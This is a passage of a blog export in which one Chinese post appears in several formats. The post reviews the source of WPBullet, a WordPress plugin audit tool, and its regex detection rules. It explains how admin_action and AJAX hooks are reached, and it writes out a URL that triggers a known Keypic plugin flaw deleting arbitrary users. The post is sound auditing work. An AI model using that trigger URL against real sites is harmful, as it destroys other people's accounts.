20200423144616-218c30f0-852e-1.png)\n\n上图分别对非zip与zip文件进行下载处理。当然，如果我们用Wpbulle扫描本地插件，是不需要进行上图下载操作。\n\nScan方法中随后遍历插件目录，对后缀为php的文件调用check_file对文件进行分析，见下图红框出：\n\n![d90208a24136a7e1970ecaf0526a41a5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144634-2c4c7a90-852e-1.png)\n\n我们跟进一下check_file方法\n\n![e4269176d33264f49215762926584f92.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144654-383d2c78-852e-1.png)\n\ncheck_file方法中首先读取文件内容，并依次通过passive_check_processor\n方法与process_file方法对读取的内容进行处理\n\n### passive_check\n\n首先我们来看一下passive_check_processor方法，其实现如下\n\n![fc5fa7838808b0a3b9694102c6fa2ef2.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144710-416ae362-852e-1.png)\n\npassive_check方法中分别调用了scope_admin_actions、scope_ajax_hooks、scope_admin_init三个扫描器对文件内容进行扫描\n\n首先我们来看下scope_admin_actions\n\n![20392e9fa17660fc48c3f0e5d847b6b3.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144727-4bf79e9c-852e-1.png)\n\nscope_admin_actions方法中提供了一个正则表达式，并对文件内容进行匹配，最终返回匹配的match[4]与match[10]\n\n我们来看下这个正则表达式\n\n(add_action(\\\\s{0,}\\\\S{0,})\\\\((\\\\s{0,}\\\\S{0,})(\\\\\"\\|')(admin_action_[a-zA-Z0-9_-]+))(?!{}(\\\\\"\\|')(\\\\s{0,}\\\\S{0,}),(.+)(\\\\\"\\|')(\\\\s{0,})([a-zA-Z0-9_-]+)(\\\\s{0,})(\\\\\"\\|')\n\n要完成什么工作\n\n我们以Keypic任意用户删除漏洞举例：\n\n“最近，我们发现admin_action_钩子存在一个问题，该钩子允许任何登录的用户访问回调函数而不检查发出请求的用户是否有权限访问它们。我们发现该插件的当前版本[Keypic](https://wordpress.org/plugins/keypic/) 2.1.2，允许任何登录WordPress的人删除其他用户账号。”\n\n详细链接如下\n\n<https://www.pluginvulnerabilities.com/2016/08/15/authenticated-user-deletion-vulnerability-in-keypic/>\n\n我们再来看下漏洞代码\n\n![193f34f21a2278da00a64cd7c545fec7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144748-582db0f2-852e-1.png)\n\n这里涉及到添加action的代码如下：\n\nadd_action('admin_action_keypic_report_spam_and_delete_user',\n'keypic_report_spam_and_delete_user');\n\n通过上文的正则匹配\n\n![a377f4dc6aae03f8eb46830bc8d62fc7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144804-61e26732-852e-1.png)\n\n看一下match[4]与match[10]分别匹配到了什么\n\n![f09190ba6e67d5f9d863b200e1608e15.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144819-6a86c234-852e-1.png)\n\n![9c57480d8cf3fd846060df969c314e07.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144845-7a4603d8-852e-1.png)\n\n使用工具对该文件进行扫描，扫描结果如下\n\n![0f6269c90fdb2ee38e46ecf97d59a98e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144859-82cac570-852e-1.png)\n\n在wordpress插件中 admin_action_前缀的钩子，均可以通过\n\nhttp://[WordPress路径] /wp-admin/admin.php?action=xxx\n\n方式访问回调函数，例如案例中任意用户删除漏洞，就可以通过\n\nhttp://[WordPress路径]\n/wp-admin/admin.php?action=keypic_report_spam_and_delete_user&id= [用户ID]\n\n链接触发。\n\n注意，仅仅通过admin_action_前缀注册钩子，并不能保证只允许管理员用户可以访问该功能，这中方式注册的钩子，仅作用于可以通过后台地址来访问，而大多数已经登录的用户，均可以访问admin.php。\n\n接着我们来看下scope_ajax_hooks\n\n![86c03f73047d27c7e93f505574a24142.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144921-8f966566-852e-1.png)\n\n![fc555aac645d9ffccf002e30bd349494.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144944-9d72dcfa-852e-1.png)\n\n与上文admin_action_前缀注册钩子极为相似，以wp_ajax前缀注册的钩子，可以通过如下链接访问\n\nhttp:// [WordPress路径] /wp-admin/admin-ajax.php?action=xxx\n\n这样的url来访问回调函数\n\n最后我们来看下scope_admin_ini\n\n![e38414407b5e141909af3959de411b2a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145009-ac288826-852e-1.png)\n\n这里通过正则表达式获取所有通过add_action 函数注admin初始化信息\n\nadmin_in前缀注册钩子对应的回调函数可以通过访问admin-ajax.php与admin-post.php地址触发，同样，任意登陆的用户都可以访问该功能。\n\n总的来说：在passive_check环节中，wpBullet使用正则表达式的方式分析所有通过add_action 函数注册的 admin_action、ajax hooks\n与 admin_init信息，汇总后输出展示。\n\n### process_file\n\n接下来分析下process_file\n\n![c100f6c684b13b2a8090583ffa4eaf24.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145025-b5bdc04a-852e-1.png)\n\nprocess_file模块用来加载预先编译好的扫描插件。\n\n扫描插件存放于Modules目录\n\n![128a3c8dbcefeb6a48321afbe6de7b71.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145039-be26c7ae-852e-1.png)\n\n以代码执行漏洞为例\n\n![fa98a31b2e9f9203773f1acada5b59e1.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145053-c6878eec-852e-1.png)\n\n在插件中functions列表中罗列出高危函数，在blacklist中罗列过滤函数，程序加载插件后会调用build_pattern方法生成对应的正则规则，如下图\n\n![5fe2b3da631cc3fb9a4d669b01adf7ab.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145109-d05d3d5e-852e-1.png)\n\n在生成正则表达式的过程中，除了兼顾规则插件中的高危函数与blacklist，同时也兼顾高危函数中的参数是否可控，见下图user_input\n\n![fe5b25fd64faca21f2cf9749025d9216.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145127-dab0886a-852e-1.png)\n\n举一个简单的例子如下：\n\n![489b4d089638f26699f21e21cc39ae15.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145142-e3a0fc5c-852e-1.png)\n\n扫描结果如下：\n\n![1ad58522d4b40d2ee895bdb3999d812c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145154-eacb40d2-852e-1.png)\n\n![](media/1ad58522d4b40d2ee895bdb3999d812c.png)\n\n在这个环节中，wpBullet通过正则判断是否有用户可控变量未经black_list中的函数过滤直接传入插件高危函数列表中所对应的函数中去。\n\n总结\n----\n\n先说说Wpbullet的优点：Wpbullet是一款少有的针对wordpress审计而开发的基于文本特征的审计工具，其原理不算复杂，可扩展性比较强。\n\n再说说Wpbullet的缺点：Wpbullet是基于文本特征的分析器，与基于AST 树和CFG的RIPS等扫描器相比，Wpbullet很难准确的判断外部输入是否经过安全函数的处理，以目前插件运作的方式来看，漏报量会很大。\n\n但总的来说，使用这款工具还是可以一定程度上辅助我们对wordpress插件进行漏洞挖掘工作。","source":"_posts/Wpbuttle.md","raw":"---\ntitle: 一款针对Wordpress开发的代码审计工具——Wpbuttle（工具介绍与源码分析）\ntags: web漏洞分析\ncategories: 技术\ntop_img: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg'\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/security.jpg\ndate: 2020-05-06 17:28:09\n\n---\n\n前言\n----\n\n近日发现了一款有意思的PHP静态代码审计工具——Wpbullet。与其他PHP代码审计工具不同的是，Wpbullet是一款针对WordPress插件/主题开发的静态代码分析工具。\n\nWordpress自身代码尚且可以说很安全，但是其插件的安全却参差不齐，这款工具可以对WordPress、插件、主题进行静态代码初步的审计，方便后续的漏洞挖掘工作。\n\n由于该工具的说明文档较少，我对其工作原理以及其检测能力比较好奇，因此这篇文章除了简单介绍一下这个工具如何使用之外，更重要的是分析Wpbuttle这块工具的源码，介绍一下它的检测思路。\n\n工具安装\n--------\n\nWpbulle的github地址如下：\n\n<https://github.com/webarx-security/wpbullet>\n\n安装过程很简单，只需克隆项目、安装依赖并运行脚本即可\n\n-   \\$ git clone https://github.com/webarx-security/wpbullet wpbullet\n\n-   \\$ cd wpbullet\n\n-   \\$ pip install -r requirements.txt\n\n-   \\$ python wpbullet.py\n\npython2.x python3.x环境皆可使用。笔者这里测试使用的是python3.7环境\n\n**工具使用**\n------------\n\n可用选项：\n\n![fb622d563b38d42d6926bb912edbbbfa.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144530-065b9032-852e-1.png)\n\n值得注意的是Wpbulle这款工具除了支持对本地源代码的审计之外，还支持根据传入的插件/主题\nURL\n自动下载源码来审计。如上图使用说明可见，--path除了可以传入本地插件目录以外，还支持传入wordpress官网中插件下载路径，工具将对插件下载解压并进行审计操作。\n\n在了解了Wpbulle工具如何安装与使用后，我们来看一下Wpbulle代码，了解一下这个工具是如何实现的，以及其是否能很好的帮助我们挖出漏洞\n\n首先我们来到扫描入口处wpbullet-dev/core/scanner.py\n\n![b346bf575c9b71e177aa8a5cf7549764.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144556-15687c02-852e-1.png)\n\n在scan中，首先可以看到其根据需要，从提供的wordpress官网插件地址进行下载的操作，如下图：\n\n![4b665e17aac3c50b090098694cf9e8d1.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144616-218c30f0-852e-1.png)\n\n上图分别对非zip与zip文件进行下载处理。当然，如果我们用Wpbulle扫描本地插件，是不需要进行上图下载操作。\n\nScan方法中随后遍历插件目录，对后缀为php的文件调用check_file对文件进行分析，见下图红框出：\n\n![d90208a24136a7e1970ecaf0526a41a5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144634-2c4c7a90-852e-1.png)\n\n我们跟进一下check_file方法\n\n![e4269176d33264f49215762926584f92.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144654-383d2c78-852e-1.png)\n\ncheck_file方法中首先读取文件内容，并依次通过passive_check_processor\n方法与process_file方法对读取的内容进行处理\n\n### passive_check\n\n首先我们来看一下passive_check_processor方法，其实现如下\n\n![fc5fa7838808b0a3b9694102c6fa2ef2.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144710-416ae362-852e-1.png)\n\npassive_check方法中分别调用了scope_admin_actions、scope_ajax_hooks、scope_admin_init三个扫描器对文件内容进行扫描\n\n首先我们来看下scope_admin_actions\n\n![20392e9fa17660fc48c3f0e5d847b6b3.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144727-4bf79e9c-852e-1.png)\n\nscope_admin_actions方法中提供了一个正则表达式，并对文件内容进行匹配，最终返回匹配的match[4]与match[10]\n\n我们来看下这个正则表达式\n\n(add_action(\\\\s{0,}\\\\S{0,})\\\\((\\\\s{0,}\\\\S{0,})(\\\\\"\\|')(admin_action_[a-zA-Z0-9_-]+))(?!{}(\\\\\"\\|')(\\\\s{0,}\\\\S{0,}),(.+)(\\\\\"\\|')(\\\\s{0,})([a-zA-Z0-9_-]+)(\\\\s{0,})(\\\\\"\\|')\n\n要完成什么工作\n\n我们以Keypic任意用户删除漏洞举例：\n\n“最近，我们发现admin_action_钩子存在一个问题，该钩子允许任何登录的用户访问回调函数而不检查发出请求的用户是否有权限访问它们。我们发现该插件的当前版本[Keypic](https://wordpress.org/plugins/keypic/) 2.1.2，允许任何登录WordPress的人删除其他用户账号。”\n\n详细链接如下\n\n<https://www.pluginvulnerabilities.com/2016/08/15/authenticated-user-deletion-vulnerability-in-keypic/>\n\n我们再来看下漏洞代码\n\n![193f34f21a2278da00a64cd7c545fec7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144748-582db0f2-852e-1.png)\n\n这里涉及到添加action的代码如下：\n\nadd_action('admin_action_keypic_report_spam_and_delete_user',\n'keypic_report_spam_and_delete_user');\n\n通过上文的正则匹配\n\n![a377f4dc6aae03f8eb46830bc8d62fc7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144804-61e26732-852e-1.png)\n\n看一下match[4]与match[10]分别匹配到了什么\n\n![f09190ba6e67d5f9d863b200e1608e15.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144819-6a86c234-852e-1.png)\n\n![9c57480d8cf3fd846060df969c314e07.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144845-7a4603d8-852e-1.png)\n\n使用工具对该文件进行扫描，扫描结果如下\n\n![0f6269c90fdb2ee38e46ecf97d59a98e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144859-82cac570-852e-1.png)\n\n在wordpress插件中 admin_action_前缀的钩子，均可以通过\n\nhttp://[WordPress路径] /wp-admin/admin.php?action=xxx\n\n方式访问回调函数，例如案例中任意用户删除漏洞，就可以通过\n\nhttp://[WordPress路径]\n/wp-admin/admin.php?action=keypic_report_spam_and_delete_user&id= [用户ID]\n\n链接触发。\n\n注意，仅仅通过admin_action_前缀注册钩子，并不能保证只允许管理员用户可以访问该功能，这中方式注册的钩子，仅作用于可以通过后台地址来访问，而大多数已经登录的用户，均可以访问admin.php。\n\n接着我们来看下scope_ajax_hooks\n\n![86c03f73047d27c7e93f505574a24142.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144921-8f966566-852e-1.png)\n\n![fc555aac645d9ffccf002e30bd349494.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144944-9d72dcfa-852e-1.png)\n\n与上文admin_action_前缀注册钩子极为相似，以wp_ajax前缀注册的钩子，可以通过如下链接访问\n\nhttp:// [WordPress路径] /wp-admin/admin-ajax.php?action=xxx\n\n这样的url来访问回调函数\n\n最后我们来看下scope_admin_ini\n\n![e38414407b5e141909af3959de411b2a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145009-ac288826-852e-1.png)\n\n这里通过正则表达式获取所有通过add_action 函数注admin初始化信息\n\nadmin_in前缀注册钩子对应的回调函数可以通过访问admin-ajax.php与admin-post.php地址触发，同样，任意登陆的用户都可以访问该功能。\n\n总的来说：在passive_check环节中，wpBullet使用正则表达式的方式分析所有通过add_action 函数注册的 admin_action、ajax hooks\n与 admin_init信息，汇总后输出展示。\n\n### process_file\n\n接下来分析下process_file\n\n![c100f6c684b13b2a8090583ffa4eaf24.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145025-b5bdc04a-852e-1.png)\n\nprocess_file模块用来加载预先编译好的扫描插件。\n\n扫描插件存放于Modules目录\n\n![128a3c8dbcefeb6a48321afbe6de7b71.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145039-be26c7ae-852e-1.png)\n\n以代码执行漏洞为例\n\n![fa98a31b2e9f9203773f1acada5b59e1.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145053-c6878eec-852e-1.png)\n\n在插件中functions列表中罗列出高危函数，在blacklist中罗列过滤函数，程序加载插件后会调用build_pattern方法生成对应的正则规则，如下图\n\n![5fe2b3da631cc3fb9a4d669b01adf7ab.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145109-d05d3d5e-852e-1.png)\n\n在生成正则表达式的过程中，除了兼顾规则插件中的高危函数与blacklist，同时也兼顾高危函数中的参数是否可控，见下图user_input\n\n![fe5b25fd64faca21f2cf9749025d9216.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145127-dab0886a-852e-1.png)\n\n举一个简单的例子如下：\n\n![489b4d089638f26699f21e21cc39ae15.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145142-e3a0fc5c-852e-1.png)\n\n扫描结果如下：\n\n![1ad58522d4b40d2ee895bdb3999d812c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423145154-eacb40d2-852e-1.png)\n\n![](media/1ad58522d4b40d2ee895bdb3999d812c.png)\n\n在这个环节中，wpBullet通过正则判断是否有用户可控变量未经black_list中的函数过滤直接传入插件高危函数列表中所对应的函数中去。\n\n总结\n----\n\n先说说Wpbullet的优点：Wpbullet是一款少有的针对wordpress审计而开发的基于文本特征的审计工具，其原理不算复杂，可扩展性比较强。\n\n再说说Wpbullet的缺点：Wpbullet是基于文本特征的分析器，与基于AST 树和CFG的RIPS等扫描器相比，Wpbullet很难准确的判断外部输入是否经过安全函数的处理，以目前插件运作的方式来看，漏报量会很大。\n\n但总的来说，使用这款工具还是可以一定程度上辅助我们对wordpress插件进行漏洞挖掘工作。","slug":"Wpbuttle","published":1,"updated":"2020-10-28T01:02:08.395Z","_id":"ckgrozu91002iwsa98xi6b2an","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>近日发现了一款有意思的PHP静态代码审计工具——Wpbullet。与其他PHP代码审计工具不同的是，Wpbullet是一款针对WordPress插件/主题开发的静态代码分析工具。</p>\n<p>Wordpress自身代码尚且可以说很安全，但是其插件的安全却参差不齐，这款工具可以对WordPress、插件、主题进行静态代码初步的审计，方便后续的漏洞挖掘工作。</p>\n<p>由于该工具的说明文档较少，我对其工作原理以及其检测能力比较好奇，因此这篇文章除了简单介绍一下这个工具如何使用之外，更重要的是分析Wpbuttle这块工具的源码，介绍一下它的检测思路。</p>\n<h2 id=\"工具安装\"><a href=\"#工具安装\" class=\"headerlink\" title=\"工具安装\"></a>工具安装</h2><p>Wpbulle的github地址如下：</p>\n<p><a href=\"https://github.com/webarx-security/wpbullet\">https://github.com/webarx-security/wpbullet</a></p>\n<p>安装过程很简单，只需克隆项目、安装依赖并运行脚本即可</p>\n<ul>\n<li><p>$ git clone <a href=\"https://github.com/webarx-security/wpbullet\">https://github.com/webarx-security/wpbullet</a> wpbullet</p>\n</li>\n<li><p>$ cd wpbullet</p>\n</li>\n<li><p>$ pip install -r requirements.txt</p>\n</li>\n<li><p>$ python wpbullet.py</p>\n</li>\n</ul>\n<p>python2.x python3.x环境皆可使用。笔者这里测试使用的是python3.7环境</p>\n<h2 id=\"工具使用\"><a href=\"#工具使用\" class=\"headerlink\" title=\"工具使用\"></a><strong>工具使用</strong></h2><p>可用选项：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144530-065b9032-852e-1.png\" alt=\"fb622d563b38d42d6926bb912edbbbfa.png\"></p>\n<p>值得注意的是Wpbulle这款工具除了支持对本地源代码的审计之外，还支持根据传入的插件/主题<br>URL<br>自动下载源码来审计。如上图使用说明可见，–path除了可以传入本地插件目录以外，还支持传入wordpress官网中插件下载路径，工具将对插件下载解压并进行审计操作。</p>\n<p>在了解了Wpbulle工具如何安装与使用后，我们来看一下Wpbulle代码，了解一下这个工具是如何实现的，以及其是否能很好的帮助我们挖出漏洞</p>\n<p>首先我们来到扫描入口处wpbullet-dev/core/scanner.py</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144556-15687c02-852e-1.png\" alt=\"b346bf575c9b71e177aa8a5cf7549764.png\"></p>\n<p>在scan中，首先可以看到其根据需要，从提供的wordpress官网插件地址进行下载的操作，如下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144616-218c30f0-852e-1.png\" alt=\"4b665e17aac3c50b090098694cf9e8d1.png\"></p>\n<p>上图分别对非zip与zip文件进行下载处理。当然，如果我们用Wpbulle扫描本地插件，是不需要进行上图下载操作。</p>\n<p>Scan方法中随后遍历插件目录，对后缀为php的文件调用check_file对文件进行分析，见下图红框出：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144634-2c4c7a90-852e-1.png\" alt=\"d90208a24136a7e1970ecaf0526a41a5.png\"></p>\n<p>我们跟进一下check_file方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144654-383d2c78-852e-1.png\" alt=\"e4269176d33264f49215762926584f92.png\"></p>\n<p>check_file方法中首先读取文件内容，并依次通过passive_check_processor<br>方法与process_file方法对读取的内容进行处理</p>\n<h3 id=\"passive-check\"><a href=\"#passive-check\" class=\"headerlink\" title=\"passive_check\"></a>passive_check</h3><p>首先我们来看一下passive_check_processor方法，其实现如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144710-416ae362-852e-1.png\" alt=\"fc5fa7838808b0a3b9694102c6fa2ef2.png\"></p>\n<p>passive_check方法中分别调用了scope_admin_actions、scope_ajax_hooks、scope_admin_init三个扫描器对文件内容进行扫描</p>\n<p>首先我们来看下scope_admin_actions</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144727-4bf79e9c-852e-1.png\" alt=\"20392e9fa17660fc48c3f0e5d847b6b3.png\"></p>\n<p>scope_admin_actions方法中提供了一个正则表达式，并对文件内容进行匹配，最终返回匹配的match[4]与match[10]</p>\n<p>我们来看下这个正则表达式</p>\n<p>(add_action(\\s{0,}\\S{0,})\\((\\s{0,}\\S{0,})(\\“|‘)(admin_action_[a-zA-Z0-9_-]+))(?!{}(\\“|‘)(\\s{0,}\\S{0,}),(.+)(\\“|‘)(\\s{0,})([a-zA-Z0-9_-]+)(\\s{0,})(\\“|‘)</p>\n<p>要完成什么工作</p>\n<p>我们以Keypic任意用户删除漏洞举例：</p>\n<p>“最近，我们发现admin_action_钩子存在一个问题，该钩子允许任何登录的用户访问回调函数而不检查发出请求的用户是否有权限访问它们。我们发现该插件的当前版本<a href=\"https://wordpress.org/plugins/keypic/\">Keypic</a> 2.1.2，允许任何登录WordPress的人删除其他用户账号。”</p>\n<p>详细链接如下</p>\n<p><a href=\"https://www.pluginvulnerabilities.com/2016/08/15/authenticated-user-deletion-vulnerability-in-keypic/\">https://www.pluginvulnerabilities.com/2016/08/15/authenticated-user-deletion-vulnerability-in-keypic/</a></p>\n<p>我们再来看下漏洞代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144748-582db0f2-852e-1.png\" alt=\"193f34f21a2278da00a64cd7c545fec7.png\"></p>\n<p>这里涉及到添加action的代码如下：</p>\n<p>add_action(‘admin_action_keypic_report_spam_and_delete_user’,<br>‘keypic_report_spam_and_delete_user’);</p>\n<p>通过上文的正则匹配</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144804-61e26732-852e-1.png\" alt=\"a377f4dc6aae03f8eb46830bc8d62fc7.png\"></p>\n<p>看一下match[4]与match[10]分别匹配到了什么</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144819-6a86c234-852e-1.png\" alt=\"f09190ba6e67d5f9d863b200e1608e15.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144845-7a4603d8-852e-1.png\" alt=\"9c57480d8cf3fd846060df969c314e07.png\"></p>\n<p>使用工具对该文件进行扫描，扫描结果如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144859-82cac570-852e-1.png\" alt=\"0f6269c90fdb2ee38e46ecf97d59a98e.png\"></p>\n<p>在wordpress插件中 admin_action_前缀的钩子，均可以通过</p>\n<p>http://[WordPress路径] /wp-admin/admin.php?action=xxx</p>\n<p>方式访问回调函数，例如案例中任意用户删除漏洞，就可以通过</p>\n<p>http://[WordPress路径]<br>/wp-admin/admin.php?action=keypic_report_spam_and_delete_user&amp;id= [用户ID]</p>\n<p>链接触发。</p>\n<p>注意，仅仅通过admin_action_前缀注册钩子，并不能保证只允许管理员用户可以访问该功能，这中方式注册的钩子，仅作用于可以通过后台地址来访问，而大多数已经登录的用户，均可以访问admin.php。</p>\n<p>接着我们来看下scope_ajax_hooks</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144921-8f966566-852e-1.png\" alt=\"86c03f73047d27c7e93f505574a24142.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423144944-9d72dcfa-852e-1.png\" alt=\"fc555aac645d9ffccf002e30bd349494.png\"></p>\n<p>与上文admin_action_前缀注册钩子极为相似，以wp_ajax前缀注册的钩子，可以通过如下链接访问</p>\n<p>http:// [WordPress路径] /wp-admin/admin-ajax.php?action=xxx</p>\n<p>这样的url来访问回调函数</p>\n<p>最后我们来看下scope_admin_ini</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145009-ac288826-852e-1.png\" alt=\"e38414407b5e141909af3959de411b2a.png\"></p>\n<p>这里通过正则表达式获取所有通过add_action 函数注admin初始化信息</p>\n<p>admin_in前缀注册钩子对应的回调函数可以通过访问admin-ajax.php与admin-post.php地址触发，同样，任意登陆的用户都可以访问该功能。</p>\n<p>总的来说：在passive_check环节中，wpBullet使用正则表达式的方式分析所有通过add_action 函数注册的 admin_action、ajax hooks<br>与 admin_init信息，汇总后输出展示。</p>\n<h3 id=\"process-file\"><a href=\"#process-file\" class=\"headerlink\" title=\"process_file\"></a>process_file</h3><p>接下来分析下process_file</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145025-b5bdc04a-852e-1.png\" alt=\"c100f6c684b13b2a8090583ffa4eaf24.png\"></p>\n<p>process_file模块用来加载预先编译好的扫描插件。</p>\n<p>扫描插件存放于Modules目录</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145039-be26c7ae-852e-1.png\" alt=\"128a3c8dbcefeb6a48321afbe6de7b71.png\"></p>\n<p>以代码执行漏洞为例</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145053-c6878eec-852e-1.png\" alt=\"fa98a31b2e9f9203773f1acada5b59e1.png\"></p>\n<p>在插件中functions列表中罗列出高危函数，在blacklist中罗列过滤函数，程序加载插件后会调用build_pattern方法生成对应的正则规则，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145109-d05d3d5e-852e-1.png\" alt=\"5fe2b3da631cc3fb9a4d669b01adf7ab.png\"></p>\n<p>在生成正则表达式的过程中，除了兼顾规则插件中的高危函数与blacklist，同时也兼顾高危函数中的参数是否可控，见下图user_input</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145127-dab0886a-852e-1.png\" alt=\"fe5b25fd64faca21f2cf9749025d9216.png\"></p>\n<p>举一个简单的例子如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145142-e3a0fc5c-852e-1.png\" alt=\"489b4d089638f26699f21e21cc39ae15.png\"></p>\n<p>扫描结果如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200423145154-eacb40d2-852e-1.png\" alt=\"1ad58522d4b40d2ee895bdb3999d812c.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"media/1ad58522d4b40d2ee895bdb3999d812c.png\"></p>\n<p>在这个环节中，wpBullet通过正则判断是否有用户可控变量未经black_list中的函数过滤直接传入插件高危函数列表中所对应的函数中去。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>先说说Wpbullet的优点：Wpbullet是一款少有的针对wordpress审计而开发的基于文本特征的审计工具，其原理不算复杂，可扩展性比较强。</p>\n<p>再说说Wpbullet的缺点：Wpbullet是基于文本特征的分析器，与基于AST 树和CFG的RIPS等扫描器相比，Wpbullet很难准确的判断外部输入是否经过安全函数的处理，以目前插件运作的方式来看，漏报量会很大。</p>\n<p>但总的来说，使用这款工具还是可以一定程度上辅助我们对wordpress插件进行漏洞挖掘工作。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" 